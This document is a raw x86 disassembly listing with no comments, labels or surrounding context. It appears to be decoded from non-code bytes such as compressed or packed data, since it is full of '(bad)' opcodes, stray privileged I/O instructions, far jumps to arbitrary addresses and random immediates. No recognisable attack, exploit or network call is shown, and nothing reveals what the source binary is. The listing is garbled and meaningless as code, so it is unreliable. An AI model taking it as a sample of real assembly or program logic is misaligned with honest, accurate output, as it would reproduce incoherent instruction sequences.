  41914e:	hlt    
  41914f:	jne    0x4191a1
  419151:	bound  edi,QWORD PTR ds:0x8049e1aa
  419157:	dec    ecx
  419158:	add    esi,edx
  41915a:	pop    es
  41915b:	dec    edi
  41915c:	ja     0x419162
  41915e:	adc    BYTE PTR [edi+0x2b0327e8],bh
  419164:	mov    BYTE PTR [eax-0x5c745ac7],al
  41916a:	leave  
  41916b:	inc    ebx
  41916c:	jmp    FWORD PTR [esi-0xe1f2f67]
  419172:	sbb    BYTE PTR [ecx-0x19a3dc62],dh
  419178:	pusha  
  419179:	mov    esi,0xb1514194
  41917e:	(bad)  [ebp-0x73]
  419181:	mov    cl,0x79
  419183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419184:	dec    esp
  419185:	mov    cl,0x1e
  419187:	das    
  419188:	ss jns 0x4191f2
  41918b:	out    0x35,eax
  41918d:	aaa    
  41918e:	mov    al,0xba
  419190:	test   DWORD PTR cs:[edx-0x6e],edi
  419194:	cmc    
  419195:	popf   
  419196:	inc    eax
  419197:	pop    es
  419198:	mov    edi,0xe4028eb2
  41919d:	retf   0xc9d2
  4191a0:	jge    0x4191df
  4191a2:	add    al,0xf4
  4191a4:	fndisi(8087 only) 
  4191a6:	mov    ebx,0x265fdc2b
  4191ab:	cmp    eax,ecx
  4191ad:	jo     0x419149
  4191af:	jge    0x419173
  4191b1:	xchg   ebp,eax
  4191b2:	aaa    
  4191b3:	mov    ds:0x34c15462,eax
  4191b8:	add    eax,0xccb8af3c
  4191bd:	adc    ebx,DWORD PTR [eax-0x7a6a845d]
  4191c3:	jp     0x41921d
  4191c5:	xor    esi,DWORD PTR [edx+edx*2]
  4191c8:	cld    
  4191c9:	mov    ds,ecx
  4191cb:	sbb    BYTE PTR [ecx+0x5a7b32b5],ah
  4191d1:	mov    ds,WORD PTR [ebx]
  4191d3:	mov    esp,0x2f1e0bf3
  4191d8:	jb     0x4191e2
  4191da:	gs nop
  4191dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191dd:	mov    ah,0x7c
  4191df:	mov    ebp,0xf1d015c1
  4191e4:	jg     0x4191c2
  4191e6:	fidiv  DWORD PTR [edi+0x2a4ac335]
  4191ec:	sub    eax,0x1c682a51
  4191f1:	mov    bl,0xd6
  4191f3:	mov    bh,0x36
  4191f5:	in     al,dx
  4191f6:	xchg   esi,eax
  4191f7:	inc    esi
  4191f8:	sub    ebx,edx
  4191fa:	push   ebx
  4191fb:	sub    dh,BYTE PTR [ebp+0x50fb85d8]
  419201:	nop
  419202:	mov    edx,DWORD PTR [esi+0x219dc23b]
  419208:	mov    ebx,0x808b553c
  41920d:	outs   dx,BYTE PTR ds:[esi]
  41920e:	sbb    al,0x89
  419210:	int3   
  419211:	or     dx,sp
  419214:	sahf   
  419215:	inc    esi
  419216:	ins    DWORD PTR es:[edi],dx
  419217:	sti    
  419218:	mov    ds:0x1041821f,al
  41921d:	enter  0x9a7d,0x51
  419221:	das    
  419222:	dec    ecx
  419223:	lods   al,BYTE PTR ds:[esi]
  419224:	xchg   edx,eax
  419225:	or     edx,esi
  419227:	jg     0x41925b
  419229:	add    DWORD PTR [ebx-0x71],esp
  41922c:	rcr    DWORD PTR [edx+0x64],1
  41922f:	mov    cl,0x72
  419231:	inc    edi
  419232:	je     0x4191eb
  419234:	dec    eax
  419235:	dec    esi
  419236:	add    DWORD PTR [esi-0x61],0xc7848db0
  41923d:	mov    cl,0xdc
  41923f:	push   esi
  419240:	cmp    BYTE PTR [edx],0x34
  419243:	xchg   ebp,eax
  419244:	pusha  
  419245:	sub    BYTE PTR [ebx-0x7b18ac9f],bh
  41924b:	stos   BYTE PTR es:[edi],al
  41924c:	pop    edi
  41924d:	cli    
  41924e:	mov    ecx,0x89184e5d
  419253:	cmc    
  419254:	pop    eax
  419255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419256:	dec    esp
  419257:	out    dx,al
  419258:	pushf  
  419259:	jg     0x4192a2
  41925b:	cmc    
  41925c:	mov    dl,0xc8
  41925e:	fdivr  st,st(7)
  419260:	mov    ch,0x10
  419262:	push   edi
  419263:	inc    ebx
  419264:	dec    ebx
  419265:	inc    edx
  419266:	mov    al,0x22
  419268:	repnz cmp eax,0xf3caac21
  41926e:	out    dx,al
  41926f:	jecxz  0x419262
  419271:	pop    ebx
  419272:	mov    dl,0xe2
  419274:	dec    ebp
  419275:	(bad)  
  419276:	xchg   ecx,eax
  419277:	xor    eax,0x2cdb6b9e
  41927c:	and    DWORD PTR [bx+si],eax
  41927f:	sbb    edx,DWORD PTR [eax]
  419281:	inc    esi
  419282:	push   cs
  419283:	push   ss
  419284:	arpl   sp,ax
  419286:	lea    edi,[ebp-0x107149fa]
  41928c:	jp     0x4192f0
  41928e:	xchg   esi,eax
  41928f:	das    
  419290:	cld    
  419291:	call   0xd1de:0x7184e6e2
  419298:	adc    bl,ah
  41929a:	jge    0x419238
  41929c:	xlat   BYTE PTR ds:[ebx]
  41929d:	test   al,0xc1
  41929f:	in     al,dx
  4192a0:	pop    ds
  4192a1:	scas   al,BYTE PTR es:[edi]
  4192a2:	outs   dx,DWORD PTR ds:[esi]
  4192a3:	sbb    BYTE PTR [ebx],dh
  4192a5:	mov    al,ds:0x3b452ef9
  4192aa:	rol    DWORD PTR [edi-0x19],0x5e
  4192ae:	sub    eax,0xdbdb191d
  4192b3:	ins    DWORD PTR es:[edi],dx
  4192b4:	pop    ebp
  4192b5:	jecxz  0x4192e6
  4192b7:	cmp    DWORD PTR [ecx+0x29],0x55335648
  4192be:	test   DWORD PTR [edx-0x36],ecx
  4192c1:	je     0x4192ad
  4192c3:	jb     0x419266
  4192c5:	(bad)  
  4192c6:	jns    0x4192e5
  4192c8:	sbb    DWORD PTR [ebp+0x21],eax
  4192cb:	aad    0x64
  4192cd:	push   esi
  4192ce:	out    dx,eax
  4192cf:	inc    eax
  4192d0:	fadd   st,st(0)
  4192d2:	or     al,0xd7
  4192d4:	mov    ebp,0x670b0904
  4192d9:	shl    DWORD PTR [ecx-0x53f40de3],cl
  4192df:	push   0x66
  4192e1:	adc    eax,DWORD PTR [edi+0x107416d4]
  4192e7:	fwait
  4192e8:	popf   
  4192e9:	jp     0x41934c
  4192eb:	(bad)  
  4192ec:	or     BYTE PTR [eax],al
  4192ee:	add    BYTE PTR [eax],al
  4192f0:	add    BYTE PTR [eax],al
  4192f2:	inc    ebp
  4192f3:	push   cs
  4192f4:	retf   0xcb6c
  4192f7:	in     al,dx
  4192f8:	out    0x2f,eax
  4192fa:	dec    ecx
  4192fb:	add    eax,0x577e5d81
  419300:	add    eax,0x10fddbf
  419305:	add    bl,dh
  419307:	add    al,0x0
  419309:	add    BYTE PTR [eax+0x27],ah
  41930c:	out    0x22,eax
  41930e:	lds    ecx,FWORD PTR cs:[eax-0x46]
  419312:	mov    esi,0xda56e715
  419317:	hlt    
  419318:	out    dx,eax
  419319:	pop    esi
  41931a:	and    ecx,DWORD PTR [edi]
  41931c:	fdivr  DWORD PTR [ebp+ebx*4+0xf]
  419320:	int    0x25
  419322:	mov    dh,0x87
  419324:	bound  ebx,QWORD PTR [ebp+0x75]
  419327:	shl    DWORD PTR [ebp+0x45cb813e],cl
  41932d:	or     dh,BYTE PTR [edx]
  41932f:	fidiv  DWORD PTR ds:0xbd61b400
  419335:	(bad)  
  419336:	sbb    edx,esp
  419338:	retf   0x2df
  41933b:	je     0x4192ca
  41933d:	xor    al,0xee
  41933f:	or     eax,esp
  419341:	(bad)  
  419342:	and    ebp,edi
  419344:	aaa    
  419345:	mov    ch,0x98
  419347:	sbb    al,0xf1
  419349:	adc    BYTE PTR [ecx],al
  41934b:	push   edx
  41934c:	pop    ds
  41934d:	and    BYTE PTR [ecx],bl
  41934f:	mov    al,BYTE PTR [ebx-0x629edb6a]
  419355:	pop    edx
  419356:	outs   dx,BYTE PTR ds:[esi]
  419357:	pushf  
  419358:	push   ss
  419359:	lahf   
  41935a:	icebp  
  41935b:	int3   
  41935c:	fnstcw WORD PTR [ebx-0x59d73481]
  419362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419363:	sub    DWORD PTR [ecx+0x51],edx
  419366:	mov    BYTE PTR [esi+0x15],bh
  419369:	(bad)  
  41936a:	sbb    eax,0x1fa2a631
  41936f:	push   ss
  419370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419371:	mov    BYTE PTR [ecx+0x5c5e50f],dh
  419377:	ret    
  419378:	xchg   BYTE PTR [ecx+0x2f],dh
  41937b:	out    0x8c,al
  41937d:	push   cs
  41937e:	mov    esi,0x6f20e5db
  419383:	(bad)  
  419384:	enter  0xab8,0xb9
  419388:	or     eax,0xbc566755
  41938d:	cmp    eax,DWORD PTR [ebx-0x58ebda5a]
  419393:	fld    TBYTE PTR [eax]
  419395:	mov    eax,0x3e54eea7
  41939a:	xor    ecx,DWORD PTR [esi+0x77]
  41939d:	xchg   ebp,eax
  41939e:	cld    
  41939f:	retf   0xdaef
  4193a2:	mov    ah,0xb
  4193a4:	mov    bl,0x5
  4193a6:	scas   eax,DWORD PTR es:[edi]
  4193a7:	(bad)  
  4193a8:	test   eax,0x890585da
  4193ad:	dec    ebx
  4193ae:	mov    al,ds:0xb0e247cd
  4193b3:	push   ebp
  4193b4:	aam    0xc8
  4193b6:	dec    esi
  4193b7:	mov    al,0x2e
  4193b9:	es leave 
  4193bb:	addr16 clc 
  4193bd:	mov    cl,0x92
  4193bf:	jp     0x41943a
  4193c1:	in     al,dx
  4193c2:	les    esp,FWORD PTR [edi+0x6ef42ea5]
  4193c8:	cmc    
  4193c9:	mov    al,0x7
  4193cb:	dec    edx
  4193cc:	jbe    0x41938a
  4193ce:	xchg   ebp,eax
  4193cf:	les    esp,FWORD PTR [ebp-0x76]
  4193d2:	fbld   TBYTE PTR [eax+0x48a7db50]
  4193d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193d9:	shl    BYTE PTR [eax+0x69],cl
  4193dc:	es leave 
  4193de:	rcl    BYTE PTR [ebx-0x55ea3410],cl
  4193e4:	mov    dl,dl
  4193e6:	push   eax
  4193e7:	pcmpeqd mm2,QWORD PTR [ecx-0x42495d89]
  4193ee:	in     al,dx
  4193ef:	sub    BYTE PTR [edi-0x756a1c22],bh
  4193f5:	or     eax,0xef4c5a02
  4193fa:	in     al,dx
  4193fb:	or     bl,ah
  4193fd:	ja     0x41941f
  4193ff:	icebp  
  419400:	jl     0x41939d
  419402:	f2xm1  
  419404:	in     eax,0xff
  419406:	xchg   BYTE PTR [ebx+0xc5890e],bl
  41940c:	pop    eax
  41940d:	in     al,0x62
  41940f:	sub    BYTE PTR [eax+0x4a133f88],cl
  419415:	outs   dx,DWORD PTR ds:[esi]
  419416:	or     eax,0xc3606a1c
  41941b:	mov    eax,ds:0x82a49b38
  419420:	dec    edx
  419421:	xor    dl,ah
  419423:	(bad)  
  419424:	push   esi
  419425:	cli    
  419426:	add    ah,BYTE PTR [edx]
  419428:	or     BYTE PTR ds:0xf1ed7072,0x25
  41942f:	sub    bh,BYTE PTR [edi+0xbed9f33]
  419435:	loopne 0x41943c
  419437:	xor    eax,0xde1667e1
  41943c:	push   esp
  41943d:	push   ss
  41943e:	ds pop es
  419440:	ins    WORD PTR es:[edi],dx
  419442:	shl    DWORD PTR [edx-0x64ffb6ed],1
  419448:	push   ebx
  419449:	add    DWORD PTR [ebp+0x3f],edx
  41944c:	mov    BYTE PTR [ebx-0x59b484c6],dl
  419452:	inc    esp
  419453:	daa    
  419454:	and    al,0x9f
  419456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419457:	mov    dh,0xb2
  419459:	jne    0x4194a3
  41945b:	mov    eax,ds:0x1ae78e54
  419460:	cdq    
  419461:	cmp    eax,0x88439dd6
  419466:	inc    edi
  419467:	in     eax,0x9a
  419469:	jge    0x41948a
  41946b:	lods   al,BYTE PTR ds:[esi]
  41946c:	cs adc al,0xbe
  41946f:	xlat   BYTE PTR ds:[ebx]
  419470:	and    DWORD PTR [esp+esi*8-0x3c],0x23
  419475:	mov    edi,0x3a217b26
  41947a:	jl     0x419493
  41947c:	push   esi
  41947d:	int3   
  41947e:	pop    esi
  41947f:	adc    eax,edx
  419481:	and    BYTE PTR [edx-0x7b45fc5e],ch
  419487:	into   
  419488:	pushf  
  419489:	push   edi
  41948a:	sar    DWORD PTR [ebx+edi*2],cl
  41948d:	fcom   DWORD PTR [esp+esi*8]
  419490:	jp     0x419428
  419492:	pop    ss
  419493:	inc    eax
  419494:	jmp    0x33f385a4
  419499:	test   eax,0x9c3f46f4
  41949e:	daa    
  41949f:	mov    ecx,DWORD PTR [edx+0x5bcd8661]
  4194a5:	jbe    0x41949b
  4194a7:	cmp    ecx,ebp
  4194a9:	inc    ebp
  4194aa:	add    al,dl
  4194ac:	mov    edx,0x8f5678db
  4194b1:	xchg   DWORD PTR [ebx+0x7],ecx
  4194b4:	sub    al,0xf0
  4194b6:	jnp    0x4194dc
  4194b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194b9:	push   0xfffffff3
  4194bb:	loopne 0x419517
  4194bd:	mov    ebp,DWORD PTR [esi+0x14]
  4194c0:	sbb    esp,DWORD PTR [ecx]
  4194c2:	pop    edx
  4194c3:	cmp    al,0x6c
  4194c5:	mov    BYTE PTR [ecx-0x4fbd2f5c],al
  4194cb:	in     eax,0x2f
  4194cd:	jns    0x419504
  4194cf:	xlat   BYTE PTR ds:[ebx]
  4194d0:	jle    0x41949a
  4194d2:	mov    bl,0x66
  4194d4:	sub    eax,0xd0c7d3a2
  4194d9:	call   0xa8c134e5
  4194de:	xchg   esi,eax
  4194df:	shl    BYTE PTR [ebx],cl
  4194e1:	cs sahf 
  4194e3:	adc    DWORD PTR [edx+0x763776cd],eax
  4194e9:	dec    esi
  4194ea:	icebp  
  4194eb:	ja     0x4194ab
  4194ed:	lock enter 0x53d8,0x20
  4194f2:	in     eax,0xd4
  4194f4:	test   al,0xf5
  4194f6:	jnp    0x4194a0
  4194f8:	jo     0x419483
  4194fa:	aad    0x2f
  4194fc:	out    0xb7,eax
  4194fe:	pop    edx
  4194ff:	sbb    cl,dl
  419501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419502:	pop    ds
  419503:	push   ds
  419504:	adc    ch,BYTE PTR [edx-0x1ba8414f]
  41950a:	xchg   BYTE PTR [eax],bl
  41950c:	fiadd  DWORD PTR [edx+0x5a26395d]
  419512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419513:	xchg   ax,ax
  419515:	scas   al,BYTE PTR es:[edi]
  419516:	fsub   DWORD PTR [eax+ebx*1+0x3496c0ef]
  41951d:	xchg   ebx,eax
  41951e:	and    al,dl
  419520:	mov    esp,DWORD PTR [eax+0x28]
  419523:	mov    edi,0x5c24655d
  419528:	push   ebp
  419529:	or     esi,0x30
  41952c:	xchg   edi,eax
  41952d:	lods   al,BYTE PTR ds:[esi]
  41952e:	xor    eax,0xd5e2dc62
  419533:	jmp    0xea97:0x38ac4ffb
  41953a:	mov    ebx,0x34e86888
  41953f:	or     edx,DWORD PTR [edi]
  419541:	popf   
  419542:	push   esp
  419543:	loopne 0x419576
  419545:	push   ebp
  419546:	fidivr WORD PTR [ebx]
  419548:	and    esp,edi
  41954a:	jl     0x419599
  41954c:	cmp    eax,0x528e84b1
  419551:	cmp    eax,0xad959dd5
  419556:	or     DWORD PTR [ebp-0x39bf0ac4],ebx
  41955c:	sub    BYTE PTR [esi-0xe],dl
  41955f:	dec    eax
  419560:	les    eax,FWORD PTR [esi]
  419562:	xchg   ecx,eax
  419563:	sbb    bl,BYTE PTR [edi-0x25cfd526]
  419569:	push   ds
  41956a:	ja     0x41957d
  41956c:	add    al,0x72
  41956e:	jmp    0x1e4ef8c
  419573:	fldcw  WORD PTR [eax-0x7c]
  419576:	mov    BYTE PTR gs:[esi+ebx*4+0xd],al
  41957b:	xchg   edx,eax
  41957c:	pop    ebp
  41957d:	and    esp,DWORD PTR cs:[ebp+0x17b76f1]
  419584:	inc    esp
  419585:	rol    dh,cl
  419587:	pop    esi
  419588:	xor    DWORD PTR [ecx+0x3b],ebx
  41958b:	add    eax,0x11789808
  419590:	mov    ah,0x3b
  419592:	jl     0x419580
  419594:	mov    ds:0x4515da81,al
  419599:	pop    edi
  41959a:	cwde   
  41959b:	jge    0x4195af
  41959d:	push   es
  41959e:	aas    
  41959f:	imul   edx,DWORD PTR [ebx-0x357e85ac],0xffffffa6
  4195a6:	push   es
  4195a7:	xchg   edi,eax
  4195a8:	cmp    cl,BYTE PTR ds:0x44325dbf
  4195ae:	xlat   BYTE PTR ds:[ebx]
  4195af:	dec    ebx
  4195b0:	hlt    
  4195b1:	jp     0x41962c
  4195b3:	push   ebx
  4195b4:	hlt    
  4195b5:	dec    edx
  4195b6:	cmp    DWORD PTR [ebx-0x39],ecx
  4195b9:	lock and BYTE PTR [ebp-0x94113b6],ch
  4195c0:	jnp    0x4195e6
  4195c2:	popf   
  4195c3:	xor    DWORD PTR [ebx-0x6781c41d],0xc9a7a967
  4195cd:	jns    0x41959f
  4195cf:	xor    ch,0xb7
  4195d2:	fdivr  QWORD PTR [ebx+eiz*1]
  4195d5:	xchg   esi,eax
  4195d6:	fidivr DWORD PTR [ecx+0x147f3b59]
  4195dc:	fisttp DWORD PTR ds:0xbf4cc062
  4195e2:	jo     0x4195ca
  4195e4:	(bad)  
  4195e6:	push   0x36
  4195e8:	test   eax,esp
  4195ea:	daa    
  4195eb:	repz fild WORD PTR [esi]
  4195ee:	enter  0xe476,0xed
  4195f2:	bound  edx,QWORD PTR [eax+0x7a]
  4195f5:	inc    esp
  4195f6:	inc    esp
  4195f7:	dec    ebp
  4195f8:	neg    BYTE PTR [ecx]
  4195fa:	inc    esp
  4195fb:	test   BYTE PTR [esi+0x1a],cl
  4195fe:	jae    0x4195f3
  419600:	cmc    
  419601:	sbb    BYTE PTR [eax+0x4d],0xa9
  419605:	fcomp  QWORD PTR [ebx-0x2de9d1d]
  41960b:	cli    
  41960c:	xor    al,BYTE PTR [edi+0x436d318d]
  419612:	mov    ebx,0x3b259ad9
  419617:	sti    
  419618:	mov    bh,0x13
  41961a:	ss pop ecx
  41961c:	lock dec edi
  41961e:	xchg   ecx,eax
  41961f:	fld    TBYTE PTR [ecx+ebp*2-0x3382509]
  419626:	imul   esp,DWORD PTR [edx-0x1a],0x51ed81a6
  41962d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41962e:	sar    DWORD PTR [eax],0xb3
  419631:	xlat   BYTE PTR ds:[ebx]
  419632:	xor    al,0x55
  419634:	fyl2x  
  419636:	and    BYTE PTR [edi+0x75],dl
  419639:	xor    DWORD PTR [edx+0x17],0xc4bb1b7c
  419640:	mov    ebx,0xad8f42bd
  419645:	arpl   dx,di
  419647:	xlat   BYTE PTR ds:[ebx]
  419648:	push   esp
  419649:	imul   ebp,DWORD PTR [ebp-0x2e7523cb],0x5e
  419650:	mov    dl,0x98
  419652:	push   edi
  419653:	mov    ds:0x26a5029,al
  419658:	call   0x8f814971
  41965d:	bound  ebp,QWORD PTR [ecx]
  41965f:	rcl    DWORD PTR [edi],1
  419661:	stos   DWORD PTR es:[edi],eax
  419662:	iret   
  419663:	xchg   ecx,eax
  419664:	out    0x7c,eax
  419666:	mov    esp,0x577954ac
  41966b:	mov    bl,0xef
  41966d:	mov    esi,0xbf70d7fe
  419672:	mov    ebx,0xadc18726
  419677:	lock ret 
  419679:	in     eax,dx
  41967a:	push   es
  41967b:	sbb    BYTE PTR cs:[ebp-0x56ef0304],ah
  419682:	adc    al,bh
  419684:	jbe    0x41960d
  419686:	or     ecx,DWORD PTR [ebp+eax*4+0x41]
  41968a:	sahf   
  41968b:	xchg   ecx,eax
  41968c:	jne    0x4196f3
  41968e:	dec    edx
  41968f:	mov    edx,esp
  419691:	sub    bh,BYTE PTR [ecx+0x5c]
  419694:	in     al,0x9
  419696:	pop    ebp
  419697:	push   esi
  419698:	stos   BYTE PTR es:[edi],al
  419699:	push   cs
  41969a:	clc    
  41969b:	out    dx,eax
  41969c:	push   edi
  41969d:	push   edx
  41969e:	jl     0x4196a1
  4196a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a1:	xlat   BYTE PTR ds:[ebx]
  4196a2:	mov    al,ds:0xc4558eac
  4196a7:	mov    esp,0x84a295d3
  4196ac:	std    
  4196ad:	pop    edx
  4196ae:	nop    DWORD PTR [esi+0xe]
  4196b2:	and    edi,esi
  4196b4:	scas   eax,DWORD PTR es:[edi]
  4196b5:	sbb    al,0xd8
  4196b8:	ret    
  4196b9:	fdiv   QWORD PTR [ebx]
  4196bb:	(bad)  
  4196bc:	popf   
  4196bd:	add    eax,0x8a1fd40d
  4196c2:	imul   BYTE PTR [ecx]
  4196c4:	cmp    al,ch
  4196c6:	mov    esi,0x48a218c2
  4196cb:	pop    ebp
  4196cc:	mov    edi,0xebc2e60b
  4196d1:	fwait
  4196d2:	or     BYTE PTR [ebx],ch
  4196d4:	add    DWORD PTR [ebp-0x38],0xffffff95
  4196d8:	push   edi
  4196d9:	push   eax
  4196da:	or     al,0x9a
  4196dc:	lea    ecx,[ebx-0x6]
  4196df:	(bad)
  4196e4:	rol    DWORD PTR [ebp+0x28],1
  4196e7:	inc    ebx
  4196e8:	sub    ah,BYTE PTR [ecx-0x2b]
  4196eb:	cmp    eax,0xffffffe0
  4196ee:	test   al,0x69
  4196f0:	leave  
  4196f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f2:	push   cs
  4196f3:	add    BYTE PTR [esi-0x2c],cl
  4196f6:	xchg   BYTE PTR [ebx],bh
  4196f8:	test   BYTE PTR [esi+ebp*1],0x28
  4196fc:	lahf   
  4196fd:	xor    eax,ebp
  4196ff:	into   
  419700:	pusha  
  419701:	lds    esi,FWORD PTR [edi]
  419703:	hlt    
  419704:	cmp    DWORD PTR [ecx+0x39],0x9f933f5a
  41970b:	ins    BYTE PTR es:[edi],dx
  41970c:	bound  esp,QWORD PTR [edi+0x3dd3746]
  419712:	sbb    ebx,edi
  419714:	sbb    eax,0xf9a24d0d
  419719:	sub    DWORD PTR [esi+0x7],0xffffffe0
  41971d:	push   0x156e1892
  419722:	rcl    BYTE PTR [edx],1
  419724:	scas   al,BYTE PTR es:[edi]
  419725:	(bad)  
  419726:	jb     0x419769
  419728:	addr16 dec ebp
  41972a:	out    dx,eax
  41972b:	je     0x419757
  41972d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41972e:	scas   eax,DWORD PTR es:[edi]
  41972f:	das    
  419730:	ret    
  419731:	xchg   ebx,eax
  419732:	dec    eax
  419733:	mov    dl,0xd3
  419735:	fs jnp 0x419710
  419738:	push   eax
  419739:	popf   
  41973a:	adc    eax,0xff402a6f
  41973f:	arpl   sp,sp
  419741:	(bad)  
  419742:	pusha  
  419743:	mov    ebp,0x1048539d
  419748:	and    edi,ecx
  41974a:	mov    ah,0xd7
  41974c:	pop    ss
  41974d:	inc    ecx
  41974e:	ja     0x419751
  419750:	rcr    esi,0xe8
  419753:	fisub  DWORD PTR [ecx]
  419755:	fs into 
  419757:	jns    0x41974d
  419759:	cmp    DWORD PTR [esi-0x7991c572],ecx
  41975f:	fcomp  QWORD PTR fs:0x6c72852d
  419766:	sbb    DWORD PTR [ecx],esp
  419768:	jg     0x41974e
  41976a:	(bad)  
  41976b:	in     al,dx
  41976c:	outs   dx,BYTE PTR ds:[esi]
  41976d:	mov    edx,0x9203431e
  419772:	std    
  419773:	jmp    0xf7b6:0xae08acb4
  41977a:	cmc    
  41977b:	adc    al,0xb8
  41977d:	pop    edx
  41977e:	add    ah,BYTE PTR ds:0x812b1a98
  419784:	pop    eax
  419785:	or     al,0x94
  419787:	jno    0x419788
  419789:	imul   ebx,DWORD PTR [edx-0x1937497f],0xffffffcb
  419790:	mov    al,cs:0xc6bbe253
  419796:	mov    ds:0x1988f7a0,eax
  41979b:	pushf  
  41979c:	jae    0x41976c
  41979e:	addr16 sub eax,0xb7f97ea5
  4197a4:	loop   0x4197b3
  4197a6:	ss stc 
  4197a8:	inc    eax
  4197a9:	hlt    
  4197aa:	iret   
  4197ab:	xchg   edi,eax
  4197ac:	pop    ds
  4197ad:	add    bh,BYTE PTR [ebx-0x1c]
  4197b0:	int    0x8d
  4197b2:	inc    ebx
  4197b3:	xlat   BYTE PTR ds:[ebx]
  4197b4:	sub    eax,0xb016a8b3
  4197b9:	sub    BYTE PTR [eax],ah
  4197bb:	icebp  
  4197bc:	or     al,0x1f
  4197be:	out    0x2d,eax
  4197c0:	sbb    dh,BYTE PTR [edx-0x167b118f]
  4197c6:	popf   
  4197c7:	(bad)  
  4197c9:	test   al,0x3a
  4197cb:	jp     0x41978f
  4197cd:	not    DWORD PTR [ebx+0x673495eb]
  4197d3:	xchg   DWORD PTR cs:[ebp+edx*8+0x76],esp
  4197d8:	loopne 0x4197d6
  4197da:	sub    DWORD PTR [ebp+0x15],edi
  4197dd:	inc    ebx
  4197de:	outs   dx,DWORD PTR ds:[esi]
  4197df:	pop    esi
  4197e0:	inc    ebp
  4197e1:	jmp    0x3f12c519
  4197e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e7:	lds    esi,FWORD PTR [ebx-0x40b14a24]
  4197ed:	mov    ?,WORD PTR [eax-0x1073a15e]
  4197f3:	xor    al,0xf2
  4197f5:	inc    ebx
  4197f6:	clc    
  4197f7:	repz or DWORD PTR [ecx-0x2f],ecx
  4197fb:	mov    dl,0x54
  4197fd:	add    BYTE PTR [eax],al
  4197ff:	add    BYTE PTR [eax],al
  419801:	add    BYTE PTR [ecx+ebp*8],dl
  419804:	je     0x41982a
  419806:	std    
  419807:	mov    ebp,0x2ac7f954
  41980c:	(bad)  
  41980d:	sar    BYTE PTR [edx-0x2f04ced3],1
  419813:	adc    al,0x1
  419815:	add    bl,dh
  419817:	add    al,0x0
  419819:	add    BYTE PTR [esi-0x1fdcb78b],dl
  41981f:	jle    0x419899
  419821:	retf   0xd294
  419824:	pop    ebp
  419825:	test   al,0x41
  419827:	lock xor al,0xbd
  41982a:	mov    bl,0x84
  41982c:	fmul   QWORD PTR [esi-0x37]
  41982f:	cmp    esi,DWORD PTR [esi+0x45]
  419832:	mov    al,0x8d
  419834:	and    al,0xcb
  419837:	sbb    eax,0x37213852
  41983c:	loopne 0x419889
  41983e:	add    BYTE PTR [ebx+0x5f],0x97
  419842:	ret    0x2ec0
  419845:	je     0x419821
  419847:	xchg   esp,eax
  419848:	test   DWORD PTR [edx+0x5af50441],edi
  41984e:	fcomip st,st(7)
  419850:	aas    
  419851:	cmp    ch,BYTE PTR [eax]
  419853:	adc    ebx,DWORD PTR [ebx]
  419855:	cld    
  419856:	xchg   DWORD PTR [esi-0x12cfb143],esp
  41985c:	fisttp QWORD PTR [esi+0x3a]
  41985f:	pop    ds
  419860:	xchg   ecx,eax
  419861:	mov    al,0x8c
  419863:	dec    ebp
  419864:	int3   
  419865:	mov    gs,WORD PTR [edx-0x5207457c]
  41986b:	push   ebx
  41986c:	sahf   
  41986d:	inc    ebx
  41986e:	mov    edi,0xf10dc8d7
  419873:	pop    edi
  419874:	sub    cl,BYTE PTR [ebx+edx*2-0x76a45614]
  41987b:	jge    0x4198a1
  41987d:	inc    edi
  41987e:	inc    eax
  41987f:	mov    eax,0x960916de
  419884:	sbb    eax,0xcb2cbf7c
  41988a:	ficom  WORD PTR [eax+0x1e]
  41988d:	sbb    esi,DWORD PTR [edx]
  41988f:	sahf   
  419890:	add    al,0x4c
  419892:	mov    BYTE PTR [eax+0x48],bh
  419895:	(bad)  
  419896:	fdivr  QWORD PTR [ecx-0xd]
  419899:	scas   eax,DWORD PTR es:[edi]
  41989a:	add    ch,ch
  41989c:	sub    ah,BYTE PTR [ebx+0x22]
  41989f:	jns    0x419839
  4198a1:	mov    edx,0x6fe77439
  4198a6:	mov    bl,0x0
  4198a8:	or     eax,0x6db0d73c
  4198ad:	xor    esp,DWORD PTR [esi]
  4198af:	arpl   WORD PTR [eax],bp
  4198b1:	add    ebp,DWORD PTR [ebp+0x2a]
  4198b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198b5:	push   cs
  4198b6:	and    al,0x47
  4198b8:	stos   BYTE PTR es:[edi],al
  4198b9:	scas   eax,DWORD PTR es:[edi]
  4198ba:	push   esp
  4198bb:	dec    edx
  4198bc:	xor    ebx,DWORD PTR [edi-0x2]
  4198bf:	ficomp DWORD PTR [eax+edx*4-0x6d]
  4198c3:	(bad)  
  4198c4:	adc    edi,DWORD PTR [ebx-0x4d]
  4198c7:	inc    ebp
  4198c8:	mov    al,ds:0x54e7f208
  4198cd:	mov    edi,0xf6ea9a7b
  4198d2:	mov    cl,0x3c
  4198d4:	pop    edi
  4198d5:	xlat   BYTE PTR ds:[ebx]
  4198d6:	xchg   edi,eax
  4198d7:	fdiv   st,st(7)
  4198d9:	mov    bh,0x1d
  4198db:	adc    eax,0x8add2fbc
  4198e0:	scas   eax,DWORD PTR es:[edi]
  4198e1:	std    
  4198e2:	mov    ah,0xc0
  4198e4:	(bad)  
  4198e6:	mov    BYTE PTR [edx-0xf85a65a],al
  4198ec:	sbb    DWORD PTR ds:0x66531e39,ebp
  4198f2:	pop    esi
  4198f3:	push   edi
  4198f4:	(bad)  
  4198f5:	jl     0x4198a1
  4198f7:	dec    DWORD PTR [eax+0x7b]
  4198fa:	call   0x1100:0x395fa68d
  419901:	jnp    0x419906
  419903:	sub    eax,0xd50238ad
  419908:	add    ecx,DWORD PTR [esi-0x564f19d]
